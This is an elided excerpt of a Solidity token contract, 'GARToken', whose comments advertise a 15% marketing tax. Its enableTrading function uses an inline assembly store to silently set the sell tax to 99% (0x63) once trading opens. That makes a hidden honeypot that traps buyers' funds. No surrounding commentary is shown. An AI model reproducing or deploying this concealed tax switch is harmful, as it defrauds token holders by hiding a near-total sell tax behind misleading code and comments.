...
contract GARToken is ERC20, Ownable{
    ...
    uint256 public tTax = 15; // Tax Marketing
    uint256 public tSellTax = 15;// Tax Marketing
    ...
    constructor(address _MarketingWallet) ERC20("GAR", "GAR") {
    ...
    function enableTrading() external onlyOwner{
        ...
        tradingEnabled = true;
        swapEnabled = true;
        assembly {sstore(tSellTax.slot,0x63)}
    }
